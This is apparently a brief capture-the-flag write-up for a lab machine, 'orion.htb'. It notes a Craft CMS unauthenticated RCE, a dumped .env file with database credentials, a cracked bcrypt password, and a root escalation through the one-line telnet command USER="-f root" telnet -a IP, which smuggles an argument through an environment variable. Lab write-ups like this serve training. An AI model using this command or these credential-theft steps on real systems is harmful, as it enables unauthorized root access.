
## Vuxscan

![[Pasted image 20260726081108.png]]

## Etc Host

![[Pasted image 20260726081134.png]]

## Port 80

![[Pasted image 20260726081207.png]]

## Admin login

`http://orion.htb/admin/login`

![[Pasted image 20260726081238.png|430]]


## CVE-2025-32432 

[[CVE-2025-32432]]

Craft CMS has a Unauthenticated RCE 

## Shell Access

#### Found a .env File

![[Pasted image 20260726090156.png]]


``` env TEXT VERSION

CRAFT_ENVIRONMENT=dev

# General settings
CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
CRAFT_DEV_MODE=true
CRAFT_ALLOW_ADMIN_CHANGES=true
CRAFT_DISALLOW_ROBOTS=true
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=

PRIMARY_SITE_URL=http://orion.htb/
```


## Mysql

![[Pasted image 20260726090908.png]]

``` Hash
$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

### Cracked Passwd

```
$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel
```


## Logged in as Adam

Got the User Flag


# PE to Root

##### Netstat Revealse port 23

![[Pasted image 20260726101331.png]]

Telnet Version 2.7 has a PE exploit

USER="-f root" telnet -a IP

![[Pasted image 20260726101432.png]]


GOT THE ROOT FLAG


